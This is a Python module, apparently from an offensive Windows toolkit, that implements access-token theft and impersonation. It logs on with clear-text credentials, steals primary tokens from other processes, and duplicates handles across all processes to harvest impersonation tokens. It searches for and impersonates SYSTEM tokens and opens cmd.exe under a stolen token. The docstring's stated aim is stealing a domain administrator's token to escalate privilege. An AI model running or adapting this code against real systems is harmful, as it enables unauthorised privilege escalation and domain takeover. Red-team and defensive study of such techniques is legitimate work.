# -*- coding: UTF-8 -*-
# By Quentin HARDY (quentin.hardy@protonmail.com) - bobsecq

import logging
import sys
import os
from winproc import *
from windef import *
from ctypes import *
from utils import *
from anytree import Node, RenderTree, find
from tokenmanager import TokenManager

class Impersonate(TokenManager):
    """
    Impersonate a user locally.

    Features:
    - Method 1 - Make Token and Impersonate: Impersonate a user via clear text credentials with LogonUser and ImpersonateLoggedOnUser
    - Method 2 - Token Impersonation/Theft: Impersonate the security context of the logged-on user currently used by a pid.
    - Method 3 - Create a Process with a Token: Impersonate a user via a pid with token and CreateProcessWithTokenW()
    - Method 4 - Create a Process with a Token: Impersonate a user via a pid with token and CreateProcessAsUser(). SeAssignPrimaryTokenPrivilege required.
    - Enable privilege on a token
    - Get all User Rights (privileges) associated with the current process
    - Get integrity level of a pid
    - Check if the current user session/process is be able to get administrator access

    Aim example: If a user is a local administrator on a system where  a  domain  administrator  is  logged  on.  The
    attacker  can  steal  the  domain administrator’s token to escalate their privilege within the domain context.

    TODO: Use SetThreadToken in Token Impersonation/Theft
    TODO: execute a command as SYSTEM via scmexec
    TODO: Local pass the hash as sekurlsa::pth in mimiktaz (require admin privs)
    """
    MAPPING_INTEGRITY_LEVEL = {0x0000: u'Untrusted',
                               0x1000: u'Low',
                               0x2000: u'Medium',
                               0x2100: u'Medium high',
                               0x3000: u'High',
                               0x4000: u'System',
                               0x5000: u'Protected process',
                               }
    MAPPING_INTEGRITY_LEVEL_INV = {v: k for k, v in MAPPING_INTEGRITY_LEVEL.items()}

    def __init__(self):
        """
        domain: full domain name e.g. 'toto.euro.dom' and not 'toto' only
        """
        #Nothing to do
        pass

    def impersonateViaCreds(self,
                            login,
                            password,
                            domain,
                            logonType=LOGON32_LOGON_NEW_CREDENTIALS,
                            logonProvider=LOGON32_PROVIDER_DEFAULT):
        """
        Attempts to log a user on to the local computer with LogonUser() and uses ImpersonateLoggedOnUser().

        Notice: The account specified by login, must have the necessary account rights.
        For example, to log on a user with the LOGON32_LOGON_INTERACTIVE flag, the user (or a group to which the user
        belongs) must have the SE_INTERACTIVE_LOGON_NAME account right.
        When LOGON32_LOGON_NEW_CREDENTIALS, a new logon session is created. See followin link for details:
        https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-and-alternate-credentials/
        Details: https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
        :param login: the account
        :param password: the password
        :param domain: the domain name or full domain name e.g. 'toto.euro.dom' or not 'toto' only
        :param logonType: The type of logon operation to perform. LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_LOGON_NETWORK_CLEARTEXT etc
        :return: Return True if no error, otherwise return False
        """
        if login == None:
            logging.error("Username is set to None in impersonateViaCreds()")
            return False
        if password == None:
            logging.error("Password is set to None in impersonateViaCreds()")
            return False
        if domain == None:
            logging.info("Domain is set to None in impersonateViaCreds()")
        logging.info("Trying to impersonate the user {1}\{0} locally...".format(repr(domain), repr(login)))
        hToken = HANDLE()
        status = LogonUser(login,
                               domain,
                               password,
                               logonType,
                               logonProvider,
                               byref(hToken))
        if status == 0:
            logging.error("Impossible to logon with user {0}: {1}".format(repr(login), getLastErrorMessage()))
            return False
        try:
            ImpersonateLoggedOnUser(hToken)
        except Exception as e:
            logging.error("Impossible to impersonate user {0}: {1}".format(repr(login), e))
            return False
        self.closeHandle(hToken)
        logging.info("User {0} ({1}) impersonated locally now".format(repr(getCurrentUsernameW()), repr(GetCurrentUsername())))
        return True

    def terminateImpersonation(self):
        """
        Terminates the impersonation of the client application.

        RevertToSelf() and close main handle.
        "If RevertToSelf fails, your application continues to run in the context of the client, which is not
        appropriate. You should shut down the process if RevertToSelf fails."
        :return:  Return True if no error, otherwise return False
        """
        logging.info("Trying to terminate the impersonation of the current thread...")
        try:
            RevertToSelf()
        except Exception as e:
            logging.error("Impossible to terminate the impersonation: {0}".format(e))
            return False
        logging.info("Impersonation terminated now")
        return True

    def impersonateViaPID(self, pid):
        '''
        The calling thread impersonate the security context of the logged-on user currently used by a pid (impersonation
        of the primary token).

        Get the primary token of the process and impersonate it.
        The current user should be privileged on the current system (e.g. SeDebugPrivilege) or he should have privileges
        on targeted system/token.
        :param pid: seletec pid
        :return: False if an error. Otherwise True
        '''
        logging.info("Trying to impersonate the primary token of the pid {0}...".format(pid))
        hToken = self.getProcessTokenOfPid(pid, tokenAcess=MAXIMUM_ALLOWED)
        if hToken == None:
            return False
        else:
            try:
                ImpersonateLoggedOnUser(hToken)
            except Exception as e:
                logging.warning("Impossible to impersonate primary token of pid {0}: {1}".format(pid, e))
                self.closeHandle(hToken)
                return False
        self.closeHandle(hToken)
        logging.info("Primary token of pid {0} has been successfully impersonated. Current username: {1}".format(pid, repr(getCurrentUsernameW())))
        return True

    def createProcessFromPidWithTokenW(self,
                                       pid,
                                       logonFlags,
                                       appName,
                                       cmdLine,
                                       creationFlags,
                                       env,
                                       currentDirectory,
                                       startupInfo):
        '''
        Create a new Process with the Token of a specified pid with CreateProcessWithTokenW().

        It creates a duplicate of a targeted user’s token and then it calls the CreateProcessWithTokenW() to start
        a new process with the duplicated token.
        SeImpersonatePrivilege is required most of the time.
        :param pid: targeted pid
        :param logonFlags: LOGON_WITH_PROFILE or LOGON_NETCREDENTIALS_ONLY
        :param appName: The name of the bin/script to be execute.
        :param cmdLine: The command line to be executed.
        :param creationFlags: The flags that control how the process is created. CREATE_NEW_CONSOLE, CREATE_SUSPENDED, etc
        :param env: Environment block for the new process.
        :param currentDirectory: The full path to the current directory for the process
        :param startupInfo: A STARTUPINFO or STARTUPINFOEX structure.
        :return: None if an error. Otherwise processinfo
        '''
        logging.debug("Trying to create a new Process with the Token from pid {0} with createProcessWithTokenW()".format(pid))
        #The handle must have the TOKEN_QUERY, TOKEN_DUPLICATE, and TOKEN_ASSIGN_PRIMARY access rights.
        hTokendupe = self.getImpersonationTokenFromPrimaryTokenForPID(pid)
        if hTokendupe == None:
            logging.error("Impossible to get an access token for pid {0}".format(pid))
            return None
        lpProcessInformation = PROCESS_INFORMATION()
        try:
            CreateProcessWithToken(hTokendupe,
                                   logonFlags,
                                   appName,
                                   cmdLine,
                                   creationFlags,
                                   env,
                                   currentDirectory,
                                   byref(startupInfo),
                                   byref(lpProcessInformation))
        except Exception as e:
            logging.error("Impossible to use CreateProcessWithToken(): {0}".format(e))
            self.closeHandle(hTokendupe)
            return None
        if lpProcessInformation == None:
            logging.error("Impossible to run createProcessWithTokenW in createProcessWithPid(): {0}".format(getLastErrorMessage()))
            self.closeHandle(hTokendupe)
            return None
        elif lpProcessInformation.dwProcessId==0:
            logging.error("Impossible to run createProcessWithTokenW in createProcessWithPid(): {0}".format(getLastErrorMessage()))
            self.closeHandle(hTokendupe)
            return None
        else:
            logging.debug("createProcessWithPid started with success, pid {0}".format(lpProcessInformation.dwProcessId))
            self.closeHandle(hTokendupe)
            return lpProcessInformation

    def createProcessFromPidWithAsUser(self,
                                       pid,
                                       appName,
                                       cmdLine,
                                       processAttributes,
                                       threadAttributes,
                                       bInheritHandles,
                                       creationFlags,
                                       env,
                                       currentDirectory,
                                       startupInfo):
        '''
        Create a new Process with the primary Token of a specified pid with CreateProcessAsUser().

        It creates a duplicate of a targeted user’s token and then it calls the CreateProcessAsUser() to start
        a new process with the duplicated token.
        Notice: SeAssignPrimaryTokenPrivilege is required for CreateProcesAsUser according to MS.
        https://docs.microsoft.com/fr-fr/windows/security/threat-protection/security-policy-settings/replace-a-process-level-token
        See https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera
        for details about arguments of CreateProcessAsUserA
        :param pid: pid of the targeted process
        :param appName: The name of the cmd to be executed. A STRING, not a bytes.
        :param cmdLine: The command line to be executed.
        :param processAttributes: A pointer to a SECURITY_ATTRIBUTES structure that specifies a security descriptor for
                                  the new process object and determines whether child processes can inherit the returned
                                  handle to the process.
        :param threadAttributes: specifies a security descriptor for the new thread object and determines whether child
                                 processes can inherit the returned handle to the thread.
        :param bInheritHandles: If this parameter is TRUE, each inheritable handle in the calling process is inherited
                                by the new process. If the parameter is FALSE, the handles are not inherited.
        :param creationFlags: The flags that control how the process is created. CREATE_NEW_CONSOLE, CREATE_SUSPENDED, etc
        :param env: Environment block for the new process.
        :param currentDirectory: The full path to the current directory for the process
        :param startupInfo: A STARTUPINFO or STARTUPINFOEX structure.
        :return: None if an error. Otherwise returns lpProcessInformation
        '''
        logging.debug("Trying to create a new Process with the Token from pid {0} with CreateProcessAsUser()".format(pid))
        hTokendupe = self.getImpersonationTokenFromPrimaryTokenForPID(pid)
        if hTokendupe == None:
            logging.error("Impossible to get an access token for pid {0}".format(pid))
            return None
        lpProcessInformation = PROCESS_INFORMATION()
        appName = c_char_p(str.encode(appName))
        try:
            CreateProcessAsUser(hTokendupe,
                                appName,
                                cmdLine,
                                processAttributes,
                                threadAttributes,
                                bInheritHandles,
                                creationFlags,
                                env,
                                currentDirectory,
                                byref(startupInfo),
                                byref(lpProcessInformation))
        except Exception as e:
            logging.error("Impossible to execute CreateProcessAsUser(): {0}".format(e))
            self.closeHandle(hTokendupe)
            return None
        return lpProcessInformation

    def createProcessWithThreadEffectiveToken(self,
                                       appName,
                                       cmdLine,
                                       processAttributes,
                                       threadAttributes,
                                       bInheritHandles,
                                       creationFlags,
                                       env,
                                       currentDirectory,
                                       startupInfo,
                                       fixSessionID):
        '''
        Execute a command as the current thread token (impersonation token) or process token (primary token)
        if thread is not impersonating.
        
        :param appName: The name of the cmd to be executed. A STRING, not a bytes.
        :param cmdLine: The command line to be executed.
        :param processAttributes: A pointer to a SECURITY_ATTRIBUTES structure that specifies a security descriptor for
                                  the new process object and determines whether child processes can inherit the returned
                                  handle to the process.
        :param threadAttributes: specifies a security descriptor for the new thread object and determines whether child
                                 processes can inherit the returned handle to the thread.
        :param bInheritHandles: If this parameter is TRUE, each inheritable handle in the calling process is inherited
                                by the new process. If the parameter is FALSE, the handles are not inherited.
        :param creationFlags: The flags that control how the process is created. CREATE_NEW_CONSOLE, CREATE_SUSPENDED, etc
        :param env: Environment block for the new process.
        :param currentDirectory: The full path to the current directory for the process
        :param startupInfo: A STARTUPINFO or STARTUPINFOEX structure.
        :param fixSessionID: BOOL: if enabled, session ID of the selected token for creating new process is set to the
                                   current session ID (if the thread is impersonating).
        :return: None if an error. Otherwise returns lpProcessInformation
        '''
        hToken = self.getCurrentThreadEffectiveToken(desiredAccessThread=TOKEN_ALL_ACCESS, desiredAccessProcess=TOKEN_ALL_ACCESS)
        if hToken == None:
            return None
        if fixSessionID ==True and TokenManager.getTokenInformationTokenType(hToken) == TokenImpersonation:
            sessionID = self.getCurrentSessionID()
            if sessionID == None:
                logging.error("Impossible to get current session ID, impossible to continue")
                return None
            if sessionID == TokenManager.getTokenInformationTokenSessionId(hToken):
                logging.debug("Token session has not be modified because identical to current session id")
            else:
                status = TokenManager.setTokenSession(hToken, sessionID)
                if status == False:
                    logging.error("Impossible to set current session ID on effective token, impossible to continue")
                    return None
                else:
                    logging.debug('Impersonation token used for creating process fixed on current session id')
        lpProcessInformation = PROCESS_INFORMATION()
        appName = c_char_p(str.encode(appName))
        try:
            CreateProcessAsUser(hToken,
                                appName,
                                cmdLine,
                                processAttributes,
                                threadAttributes,
                                bInheritHandles,
                                creationFlags,
                                env,
                                currentDirectory,
                                byref(startupInfo),
                                byref(lpProcessInformation))
        except Exception as e:
            logging.error("Impossible to execute CreateProcessAsUser(): {0}".format(e))
            self.closeHandle(hToken)
            return None
        logging.debug("Normally, process is created successfully")
        return lpProcessInformation

    def getCurrentSessionID(self):
        '''
        Get the current Session ID

        Use the primary token, session ID parameter, for getting the session id.
        :return: session id or None if an error
        '''
        hToken = TokenManager.getCurrentProcessToken(desiredAccess=TOKEN_QUERY)
        if hToken == None:
            logging.error("impossible to get current Session ID from primary token")
            return None
        sessionID = TokenManager.getTokenInformationTokenSessionId(hToken)
        if sessionID == None:
            logging.error("impossible to get current Session ID from primary token")
        else:
            logging.debug("Session ID (from current primary token): {0}".format(sessionID))
        TokenManager.closeHandle(hToken)
        return sessionID


    def executeCMDWithThreadEffectiveToken(self):
        '''
        Execute a cmd.exe prompt with the current thread effective token i.e. impersonation token if thread is
        impersonating or primary token otherwise.

        :return: None if an error. Otherwise returns lpProcessInformation
        '''
        logging.info("Trying to open a cmd.exe interactive shell with effective token...")
        windirPath = 'C:\Windows'
        try:
            windirPath = os.environ['WINDIR']
        except Exception as e:
            logging.error("Impossible to get WINDIR env var, set to c:\windows: {0}".format(e))
        appName = os.path.join(windirPath, 'System32', 'cmd.exe')
        cmdLine = None
        processAttributes = None
        threadAttributes = None
        bInheritHandles = True
        creationFlags = CREATE_NEW_CONSOLE
        env = None
        currentDirectory = None
        startupInfo = STARTUPINFO()
        # set attributes for new window
        startupInfo.wShowWindow = 0x1  # 0x1 == show normal size, 0x3 == maximize
        startupInfo.dwFlags = 0x1  # have to set this flag for the API to check the wShowWindow setting
        processinfo = self.createProcessWithThreadEffectiveToken(
                                                         appName=appName,
                                                         cmdLine=cmdLine,
                                                         processAttributes=processAttributes,
                                                         threadAttributes=threadAttributes,
                                                         bInheritHandles=bInheritHandles,
                                                         creationFlags=creationFlags,
                                                         env=env,
                                                         currentDirectory=currentDirectory,
                                                         startupInfo=startupInfo,
                                                         fixSessionID=True
                                                         )
        if processinfo == None:
            logging.error("cmd.exe interactive shell is NOT opened")
        else:
            logging.info("cmd.exe interactive shell is opened now normally")
        return processinfo

    def executeWithThreadEffectiveToken(self, appName, cmdLine=None):
        '''
        Execute a cmd with the current thread effective token i.e. impersonation token if thread is
        impersonating or primary token otherwise.

        :param appName: application name
        :param cmdLine: arguments
        :return: None if an error. Otherwise returns lpProcessInformation
        '''
        logging.info("Trying to execute {0} with effective token...".format(appName))
        processAttributes = None
        threadAttributes = None
        bInheritHandles = True
        creationFlags = CREATE_NEW_CONSOLE
        env = None
        currentDirectory = None
        startupInfo = STARTUPINFO()
        # set attributes for new window
        startupInfo.wShowWindow = 0x1  # 0x1 == show normal size, 0x3 == maximize
        startupInfo.dwFlags = 0x1  # have to set this flag for the API to check the wShowWindow setting
        processinfo = self.createProcessWithThreadEffectiveToken(
                                                         appName=appName,
                                                         cmdLine=cmdLine,
                                                         processAttributes=processAttributes,
                                                         threadAttributes=threadAttributes,
                                                         bInheritHandles=bInheritHandles,
                                                         creationFlags=creationFlags,
                                                         env=env,
                                                         currentDirectory=currentDirectory,
                                                         startupInfo=startupInfo,
                                                         fixSessionID=True
                                                         )
        if processinfo == None:
            logging.error("Command is not executed")
        else:
            logging.info("Command executed")
        return processinfo

    def canGetAdminAccess(self):
        """
        Check if the current user thread (session/process) is be able to get administrator access.
        Returns True if the current user has currently administrator accesses.
        Otherwise returns False.

        Check if
        - effective token for current thread is in lcoal administrator group.
        - get elevation type of the current effective token for current thread.

        :return: Retuns True if the current user can be administrator. Otherwise return False. Return None if error.
        """
        # On XP or lower there is not UAC
        # Note: sys.getwindowsversion() does work on every system
        if sys.getwindowsversion()[0] < 6:
            isUserAnAdmin = bool(IsUserAnAdmin())
            if isUserAnAdmin == True:
                logging.debug("XP or lower. The current process is be able to get administrator access")
                return True
            else:
                logging.debug("XP or lower. The current process is NOT be able to get administrator access")
                return False
        # On Vista or higher, there is a UAC by default
        isInAdmin = self.isEffectiveTokenInBuiltinAdministrators()
        if isInAdmin == True:
            logging.debug("Can get admin access because Token in Administrators group")
            return True
        logging.debug("Can NOT get admin access via Administrators group & token, checking elevation type...")
        hToken = self.getCurrentThreadEffectiveToken()
        if hToken == None:
            return None
        elevationType = self.getTokenInformationTokenElevationType(hToken)
        if elevationType == TokenElevationTypeLimited:
            logging.debug("The token elevation type is 'limited', so there is a UAC and there is perhaps a linked token")
            linkedToken = self.getTokenInformationTokenLinkedToken(hToken)
            if linkedToken == None:
                logging.debug("There is not a linked token. The current process can NOT get admin access")
                self.closeHandle(hToken)
                return False
            else:
                logging.debug("There is a linked token. The current process can get admin access directly BUT there is an UAC")
                self.closeHandle(hToken)
                return True
        elif elevationType == TokenElevationTypeFull:
            logging.debug("The token elevation is Full. The current process can get admin access")
            self.closeHandle(hToken)
            return True
        else:
            logging.debug("The token elevation is Default. So no UAC but not in Administrator groups,")
            logging.debug("so the current process can NOT get admin access")
            self.closeHandle(hToken)
            return False
        logging.debug("It seems the current process can NOT be used tor getting admin access")
        self.closeHandle(hToken)
        return False

    def getAllTokensAccessibleViaThreads(self, targetPID=None, impersonation=True, full=True):
        """
        Get all Tokens for all targeted processes via "threads" method.

        For each process, runs over threads for getting impersonation tokens.
        If the process is a Protected Process, do nothing.
        :param targetPID: for targeting a pid only. By default, all processes according privileges
        :param full: if enabled, extract all information about token, otherwise limited info only
        :return: None if an Error. Otherwise return all tokens
        """
        allInfo = {}
        logging.debug("Getting all Tokens which are accessible (targetPID={0}) via threads...".format(targetPID))
        self.enableUserRight('SeDebugPrivilege')
        self.enableUserRight('SeAssignPrimaryTokenPrivilege')
        returnBufferSize = c_ulong(0)
        status = NtQuerySystemInformation(SystemProcessInformation, None, 0x0, byref(returnBufferSize))
        buffer = create_string_buffer(returnBufferSize.value)
        status = NtQuerySystemInformation(SystemProcessInformation,
                                          byref(buffer),
                                          returnBufferSize.value,
                                          byref(returnBufferSize))
        if status != STATUS_SUCCESS:
            logging.error("Impossible to NtQuerySystemInformation - SystemProcessInformation - 2")
            return None
        cProcess = cast(buffer, POINTER(SYSTEM_PROCESS_INFORMATION)).contents
        logging.debug("Running over all Process IDs")
        while cProcess.NextEntryOffset:
            cProcess = cast(addressof(cProcess) + cProcess.NextEntryOffset,
                            POINTER(SYSTEM_PROCESS_INFORMATION)).contents
            cPID = cProcess.UniqueProcessId
            nbThreads = cProcess.NumberOfThreads
            logging.debug("Getting info about process: {0}".format(str(cProcess)))
            if (targetPID == None) or (cPID == targetPID):
                    allInfo[cPID] = []
                    tokenDetails = self.getPrimaryTokenOfPid(pid=cPID, impersonation=True, loggingOnError=False, full=full)
                    if tokenDetails != None:
                        logging.debug("Primary token got, saving")
                        allInfo[cPID].append(tokenDetails)
                    logging.debug("Getting Impersonation Token for this process from {0} threads...".format(nbThreads))
                    #Each Thread def is after process in a SYSTEM_THREAD_INFORMATION
                    positionThread = addressof(cProcess)
                    for iOnTh in range(nbThreads):
                        cThread = cast(positionThread + sizeof(cProcess), POINTER(SYSTEM_THREAD_INFORMATION)).contents
                        positionThread += sizeof(cThread)
                        threadID = cThread.ClientID.UniqueThread
                        logging.debug("Trying to open thread {0} ({1}/{2})".format(threadID,iOnTh+1,nbThreads))
                        hThread = OpenThread(THREAD_ALL_ACCESS, False, threadID)
                        if hThread == None:
                            logging.debug("Impossible to Open Thread for THREAD_ALL_ACCESS on {0}: {1}".format(threadID, getLastErrorMessage()))
                        else:
                            logging.debug("Trying to open token of thread {0} ({1}/{2})".format(threadID, iOnTh + 1, nbThreads))
                            hToken = HANDLE(c_void_p(-1).value)
                            try:
                                OpenThreadToken(hThread, TOKEN_QUERY, False, byref(hToken))
                            except Exception as e:
                                logging.error("Impossible to OpenThreadToken 1: {0}".format(e))
                            if hToken.value == None:
                                logging.debug("Impossible to OpenThreadToken 2: {0}".format(getLastErrorMessage()))
                            else:
                                tokenDetails = self.extractTokenInfo(hToken, full=full)
                                canImpersonate = None
                                if impersonation == True:
                                    canImpersonate = self.canImpersonateToken(hToken)
                                tokenDetails['canimpersonate'] = canImpersonate
                                allInfo[cPID].append(tokenDetails)
                                self.closeHandle(hToken)
                            self.closeHandle(hThread)
        return allInfo

    def getAllTokensAccessible(self, targetPID=None, impersonation=True, full=True, avoidPID=[]):
        '''
        Get all Tokens which are accessible for all processes targeted via "handles" medthod.

        For each process selected, the list of all handles attached to the process is covered for getting impersonation
        tokens. For each process, gets primary token.
        If the process is a Protected Process, do nothing.
        :param pid: for targeting a pid only. By default, all processes according privileges
        :param impersonation: check if token can be impersonated. Enable by default.
        :param full: if enabled, extract all information about token, otherwise limited info only
        :param avoidPID: a list of pids to avoid
        :return: None if an Error. Otherwise return all tokens
        '''
        allInfo = {}
        logging.debug("Getting all Tokens which are accessible (targetPID={0}) via handles...".format(targetPID))
        self.enableUserRight('SeDebugPrivilege')
        self.enableUserRight('SeAssignPrimaryTokenPrivilege')
        returnBufferSize = c_ulong(0)
        status = NtQuerySystemInformation(SystemProcessInformation, None, 0x0, byref(returnBufferSize))
        buffer = create_string_buffer(returnBufferSize.value)
        status = NtQuerySystemInformation(SystemProcessInformation,
                                          byref(buffer),
                                          returnBufferSize.value,
                                          byref(returnBufferSize))
        if status != STATUS_SUCCESS:
            logging.error("Impossible to NtQuerySystemInformation - SystemProcessInformation - 2")
            return None
        cProcess = cast(buffer, POINTER(SYSTEM_PROCESS_INFORMATION)).contents
        logging.debug("Running over all Process IDs")
        while cProcess.NextEntryOffset:
            cProcess = cast(addressof(cProcess) + cProcess.NextEntryOffset, POINTER(SYSTEM_PROCESS_INFORMATION)).contents
            cPID = cProcess.UniqueProcessId
            logging.debug("Getting info about process: {0}".format(str(cProcess)))
            if ((targetPID==None) or (cPID == targetPID)) and cPID not in avoidPID:
                allInfo[cPID] = []
                #Do not manage "Protected Process": https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
                hProcess = OpenProcess(MAXIMUM_ALLOWED, False, cPID) #PROCESS_QUERY_INFORMATION ?
                if hProcess == 0 or hProcess == None:
                    logging.debug("Impossible to Open Process for MAXIMUM_ALLOWED on pid {0}: {1}".format(cPID, getLastErrorMessage()))
                else:
                    logging.debug("Process {0} opened with MAXIMUM_ALLOWED".format(cPID))
                    logging.debug("Running over all {0} handles of process with pid {1} for impersonation tokens...".format(cProcess.HandleCount ,cPID))
                    #PART 1: RUNNING OVER ALL HANDLES OPENED ON THE TARGETED PROCESS
                    for iHandle in range(cProcess.HandleCount):
                        if cProcess != INVALID_HANDLE_VALUE:
                            hObject = HANDLE()
                            hDuplicate = ((iHandle + 1) * 8)
                            #Duplicate handle. Can be any type (e.g. TOKEN, File, Semaphore, etc)
                            status = DuplicateHandle(
                                                hProcess,#A handle to the process with the handle to be duplicated.
                                                hDuplicate, #The handle to be duplicated.
                                                GetCurrentProcess(),#A handle to the process that is to receive the duplicated handle.
                                                byref(hObject),
                                                MAXIMUM_ALLOWED,
                                                False,
                                                DUPLICATE_SAME_ACCESS)
                            if status == 0:
                                #logging.debug("Impossible to DuplicateHandle for handle {0}: {1}".format(hDuplicate, getLastErrorMessage()))
                                pass
                            else:
                                hObject = hObject.value
                                # hObject can be an handle to a Token or Otherwise
                                objectInfo = self.getObjectInfo(hObject, objectInfoClass=ObjectTypeInformation)
                                if objectInfo == None:
                                    self.closeHandle(hObject)
                                else:
                                    if objectInfo == "Token":
                                        # Checking if impersonation access token. Normally, always the case
                                        isImpersToken = self.isImpersonationToken(hObject, loggingOnError=False)
                                        if isImpersToken == True:
                                            logging.debug("Token handle at {0} is an impersonation token, saving".format(hDuplicate))
                                            tokenDetails = self.extractTokenInfo(hObject, handleValue=hDuplicate, handleID=iHandle, full=full)
                                            canImpersonate = self.canImpersonateToken(hObject)
                                            tokenDetails['canimpersonate']=canImpersonate
                                            allInfo[cPID].append(tokenDetails)
                                    else:
                                        self.closeHandle(hObject)

                    # Close the opened process
                    self.closeHandle(hProcess)
                    # PART 2: GET THE PRIMARY TOKEN LINKED TO THIS PROCESS
                    tokenDetails = self.getPrimaryTokenOfPid(pid=cPID, impersonation=impersonation, loggingOnError=False, full=full)
                    if tokenDetails != None:
                        logging.debug("Primary token got, saving")
                        allInfo[cPID].append(tokenDetails)
        logging.debug("All Tokens which are accessible (targetPID={0}): {1} pid(s) found".format(targetPID, len(allInfo)))
        return allInfo

    def getSystemTokensAccessible(self, targetPID=None, oneMaxByPid=False, impersonationPossibleOnly=False):
        '''
        Get all SYSTEM tokens accessible which are accessible from current thread.

        Use getAllTokensAccessible() i.e. handle method and uses 'issystem' parameter.
        :param targetPID: targted pid, or None if for searching on all processes
        :param oneMaxByPid: max one token info by pid (first one)
        :param impersonationPossibleOnly: get system tokens which can be impersonated only.
        :return: None if an error
        '''
        info = {}
        allTokens = self.getAllTokensAccessible(targetPID=targetPID, impersonation=True)
        if allTokens == None:
            return None
        for aPID in allTokens:
            for aTokenInfo in allTokens[aPID]:
                if aTokenInfo['issystem'] == True:
                    if ((impersonationPossibleOnly == True and aTokenInfo['canimpersonate']==True) or
                            impersonationPossibleOnly == False):
                        if aPID not in info:
                            info[aPID] = []
                        if oneMaxByPid == True and len(info[aPID])>=1:
                            #Don't save result because already one token
                            pass
                        else:
                            info[aPID].append(aTokenInfo)
        return info

    def printAllTokensAccessible(self, targetPID=None, printFull=True, printLinked=False, _useThreadMethod=False):
        '''
        Print all tokens (primary and impersonate) of each process or a specific process.

        By default, 'handle' methode is used for getting impersonation tokens.
        See getAllTokensAccessible() for details.
        :param targetPID: Targeted pid or None if you want target all processes.
        :param printFull: Print all information about each token if enabled.
        :param printLinked: Print the linked token if enabled.
        :param _useThreadMethod: If enabled, use the "thread" method for getting impersonation tokens. "Handles" method
                                 by default.
        :return: True or False
        '''
        print("Tokens which are accessible from current process:")
        if _useThreadMethod == False:
            allTokens = self.getAllTokensAccessible(targetPID=targetPID)
        else:
            allTokens = self.getAllTokensAccessibleViaThreads(targetPID=targetPID)
        if allTokens == None:
            return False
        status = self.printTokens(allTokens, printFull=printFull, printLinked=printLinked)
        self.closeAllHandles(allTokens)
        return status

    def printSystemTokensAccessible(self,
                                    targetPID=None,
                                    oneMaxByPid=False,
                                    impersonationPossibleOnly=False,
                                    printFull=True):
        '''
        Print all SYSTEM tokens accessible.
        
        By default, 'handle' method is used for getting impersonation tokens.
        See getAllTokensAccessible() for more details.
        :param targetPID: Targeted pid or None if you want target all processes.
        :param oneMaxByPid: max one token info by pid (first one)
        :param impersonationPossibleOnly: get system tokens which can be impersonated only.
        :param printFull: Print all information about each token if enabled.
        :return: True or False
        '''
        print("Tokens which are accessible from processes:")
        allTokens = self.getSystemTokensAccessible(targetPID=targetPID,
                                                   oneMaxByPid=oneMaxByPid,
                                                   impersonationPossibleOnly=impersonationPossibleOnly)
        if allTokens == None:
            return False
        status = self.printTokens(allTokens, printFull=printFull, printLinked=False)
        self.closeAllHandles(allTokens)
        return status

    def impersonateFirstSystemToken(self, allTokens):
        '''
        Impersonate the first SYSTEM token in allTokens when possible

        :param allTokens: dict of tokens
        :return: True if impersonated or False
        '''
        logging.debug("Trying to impersonate a SYSTEM token, if there is one available...")
        if allTokens == None or allTokens == {}:
            logging.warning("Nothing to impersonate. Dict is empty")
            return False
        for aPID in allTokens:
            for aTokenInfo in allTokens[aPID]:
                if aTokenInfo['issystem'] == True and \
                   (aTokenInfo['canimpersonate'] == None or  aTokenInfo['canimpersonate'] == True):
                    #Token with impersonation impossible because already tested is skipped.
                    hToken = aTokenInfo['token']
                    logging.debug("Trying to impersonate the handle {0} from pid {1}".format(hToken, aPID))
                    try:
                        ImpersonateLoggedOnUser(hToken)
                    except Exception as e:
                        logging.debug("Impossible to impersonate with handle {0}: {1}".format(hToken, e))
                        logging.debug("Try another one")
                    else:
                        logging.debug("Impersonation successful with handle {0}".format(hToken))
                        logging.info("Current username: {0} ({1})".format(repr(getCurrentUsernameW()), repr(GetCurrentUsername())))
                        return True
        logging.debug("Impossible to impersonate a SYSTEM token")
        return False

    def searchAndImpersonateFirstSystemToken(self, targetPID=None, printAllTokens=False):
        '''
        Get all access tokens of targeted processes and try to impersonate a system token.

        By default, 'handle' method is used for getting impersonation tokens.
        See getAllTokensAccessible() for more details.
        :param targetPID: Targeted pid or None if you want target all processes
        :param printAllTokens: Print all tokens before impersonation
        :return: True if SYSTEM impersonation success or false (error or no one SYSTEM token)
        '''
        logging.debug("Trying to impersonate a SYSTEM token if there is one accessible...")
        allTokens = self.getAllTokensAccessible(targetPID=targetPID)
        if printAllTokens == True:
            self.printTokens(allTokens)
        status = self.impersonateFirstSystemToken(allTokens)
        self.closeAllHandles(allTokens)
        return status

    def getTokensAccessibleFilter(self, targetPID=None, filter={}, _useThreadMethod=False):
        '''
        Get all accessible tokens according to filter
        :param targetPID: for targeting a pid only. By default, all processes according privileges
        :param filter: dictionary e.g. {'intlvl':'System'} for filtering on tokens
        :param _useThreadMethod: If enabled, use the "thread" method for getting impersonation tokens. "Handles" method
                                 by default.
        :return: Tokens (dictionary) or None if an error
        '''
        tokensFiltered = {}
        if _useThreadMethod == True:
            allTokens = self.getAllTokensAccessibleViaThreads(targetPID=targetPID)
        else:
            allTokens = self.getAllTokensAccessible(targetPID=targetPID)
        if allTokens == None:
            return None
        for aPID in allTokens:
            for aTokenInfo in allTokens[aPID]:
                okParams = []
                for aParam in filter:
                    if aParam in aTokenInfo:
                        if aTokenInfo[aParam] == filter[aParam]:
                            okParams.append(aParam)
                if len(okParams) ==  len(filter):
                    #All params matches given filter, we save it
                    if aPID in tokensFiltered:
                        tokensFiltered[aPID].append(aTokenInfo)
                    else:
                        tokensFiltered[aPID] = [aTokenInfo]
        return tokensFiltered

    def printTokensAccessibleFilter(self, targetPID=None, filter={}, printFull=True, printLinked=False, _useThreadMethod=False):
        '''
        Print all accessible tokens according to filter
        :param targetPID: for targeting a pid only. By default, all processes according privileges
        :param filter: dictionary e.g. {'intlvl':'System'} for filtering on tokens
        :param printFull: Print all information about each token if enabled.
        :param printLinked: Print the linked token if enabled.
        :param _useThreadMethod: If enabled, use the "thread" method for getting impersonation tokens. "Handles" method
                                 by default.
        :return: True or False
        '''
        allTokens = self.getTokensAccessibleFilter(targetPID=targetPID, filter=filter, _useThreadMethod=_useThreadMethod)
        if allTokens == None:
            return False
        status = self.printTokens(allTokens, printFull=printFull, printLinked=printLinked)
